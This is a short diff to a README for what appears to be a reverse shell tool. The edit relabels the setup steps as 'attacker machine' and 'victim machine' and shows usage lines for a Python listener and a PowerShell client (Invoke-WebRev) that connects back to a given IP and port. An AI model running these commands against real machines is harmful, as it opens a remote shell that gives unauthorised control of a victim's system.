@@ -4,7 +4,7 @@
 
 ![Alt text](images/revshell.jpg "Server")
 
-On your server:
+On the attacker machine:
 ```
     python3 server.py IP PORT
     
@@ -16,7 +16,7 @@ On your server:
 
 ## Invoke-WebRev.ps1 - client
 
-On your client:
+On the victim machine:
 ```
 Import-Module .\Invoke-WebRev.ps1
 Invoke-WebRev -ip IP -port PORT [-ssl]
